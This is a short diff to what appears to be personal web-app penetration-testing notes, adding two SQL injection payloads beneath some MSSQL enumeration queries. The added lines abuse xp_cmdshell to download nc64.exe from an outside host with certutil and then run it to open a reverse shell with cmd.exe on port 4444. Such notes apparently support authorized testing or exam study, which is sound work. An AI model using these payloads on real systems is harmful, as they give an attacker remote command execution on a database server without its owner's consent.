@@ -97,6 +97,9 @@ Web App Pentest
         select name from sys.databases;
         select * from <db_name>.information_schema.tables;
         select * from master.dbo.sysusers;
+        ';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.230/nc64.exe c:/windows/temp/nc64.exe";--
+        ';EXEC xp_cmdshell "c:/windows/temp/nc64.exe 192.168.45.230 4444 -e cmd.exe";--
+
 
   Injections: 
   
